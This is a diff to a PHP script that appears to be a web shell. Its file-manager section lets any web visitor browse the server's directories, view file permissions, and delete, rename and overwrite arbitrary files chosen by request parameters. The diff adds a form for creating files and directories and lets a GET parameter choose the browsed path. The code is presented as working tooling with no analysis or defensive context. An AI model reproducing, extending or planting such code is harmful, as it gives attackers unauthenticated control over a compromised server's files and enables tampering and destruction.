@@ -139,9 +139,10 @@ if (isset($_GET['die'])) {
 <!--//File Manager-->
 <?php
     if (isset($_GET['file_manager'])) {
-        echo '<table width="900" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td><font style="color:white;">Current Path : ';$cwd = getcwd();
+    	echo "<form action='?crt' method='get'><select name='wch'><option value='file'>Make File</option><option value='dir'>Make Dir</option></select><input type='text' name='nfile'><input type='submit' name='crt' value='Creat'></form>";
+        echo '<table width="900" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td><font style="color:white;">Current Path : ';if(isset($_GET['path'])){$cwd=$_GET['path'];}else{$cwd = getcwd();} 
     $cwd = str_replace('\\','/',$cwd);$entah = explode('/',$cwd);
-function permsa($kntl){$mw = fileperms($kntl);
+function permsa($bl){$mw = fileperms($bl);
     if (($mw & 0xC000) == 0xC000) {$hnk = 's';} 
     elseif (($mw & 0xA000) == 0xA000) {$hnk = 'l';} 
     elseif (($mw & 0x8000) == 0x8000) {$hnk = '-';} 
@@ -175,13 +176,13 @@ function permsa($kntl){$mw = fileperms($kntl);
                 echo '<font color="green">Change Name Done.</font><br />'; }
             else{ echo '<font color="red">Change Name Error.</font><br />'; } 
             $_POST['name'] = $_POST['newname']; } 
-            echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';}
+            echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="gox" /></form>';}
 
     elseif($_POST['opt'] == 'edit'){ 
         if(isset($_POST['src'])){ $kopet = fopen($_POST['path'],'w'); if(fwrite($kopet,$_POST['src'])){ 
             echo '<font color="green">Edit File Done.</font><br />'; }else{ echo '<font color="red">Edit File Error.</font><br />'; } 
             fclose($kopet); } 
-            echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>'; } echo '</center>';}
+            echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="gox" /></form>'; } echo '</center>';}
     else{ echo '</table><br /><center>'; 
         if(isset($_GET['option']) && $_POST['opt'] == 'delete'){ 
             if($_POST['type'] == 'dir'){ 
@@ -206,15 +207,15 @@ function permsa($kntl){$mw = fileperms($kntl);
                     if(is_writable("$cwd/$kawai") || !is_readable("$cwd/$kawai")) echo '</font>'; 
                     echo "</center></td><td><center><form method=\"POST\" action=\"?file_manager&option&path=$cwd\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$kawai\"><input type=\"hidden\" name=\"path\" value=\"$cwd/$kawai\"><input type=\"submit\" value=\">\" /></form></center></td></tr>"; } 
                     echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>'; 
-            foreach($yonchan as $kntl){ 
-                if(!is_file("$cwd/$kntl")) continue; 
-                $ngtdd = filesize("$cwd/$kntl")/1024; 
-                $ngtdd = round($ngtdd,3); 
-                if($ngtdd >= 1024){ $ngtdd = round($ngtdd/1024,2).' MB'; }else{ $ngtdd = $ngtdd.' KB'; } 
-                echo "<tr><td><a href=\"?file_manager&filesrc=$cwd/$kntl&path=$cwd\">$kntl</a></td><td><center>".$ngtdd."</center></td><td><center>"; 
-                if(is_writable("$cwd/$kntl")) echo '<font color="green">';
-            elseif(!is_readable("$cwd/$kntl")) echo '<font color="red">'; 
-                echo permsa("$cwd/$kntl"); 
-            if(is_writable("$cwd/$kntl") || !is_readable("$cwd/$kntl")) echo '</font>'; 
-    echo "</center></td><td><center><form method=\"POST\" action=\"?file_manager&option&path=$cwd\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$kntl\"><input type=\"hidden\" name=\"path\" value=\"$cwd/$kntl\"><input type=\"submit\" value=\">\" /></form></center></td></tr>"; } echo '</table></div><br><br><br>';}}?>
+            foreach($yonchan as $bl){ 
+                if(!is_file("$cwd/$bl")) continue; 
+                $lvu = filesize("$cwd/$bl")/1024; 
+                $lvu = round($lvu,3); 
+                if($lvu >= 1024){ $lvu = round($lvu/1024,2).' MB'; }else{ $lvu = $lvu.' KB'; } 
+                echo "<tr><td><a href=\"?file_manager&filesrc=$cwd/$bl&path=$cwd\">$bl</a></td><td><center>".$lvu."</center></td><td><center>"; 
+                if(is_writable("$cwd/$bl")) echo '<font color="green">';
+            elseif(!is_readable("$cwd/$bl")) echo '<font color="red">'; 
+                echo permsa("$cwd/$bl"); 
+            if(is_writable("$cwd/$bl") || !is_readable("$cwd/$bl")) echo '</font>'; 
+    echo "</center></td><td><center><form method=\"POST\" action=\"?file_manager&option&path=$cwd\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$bl\"><input type=\"hidden\" name=\"path\" value=\"$cwd/$bl\"><input type=\"submit\" value=\">\" /></form></center></td></tr>"; } echo '</table></div><br><br><br>';}}?>
 </div>
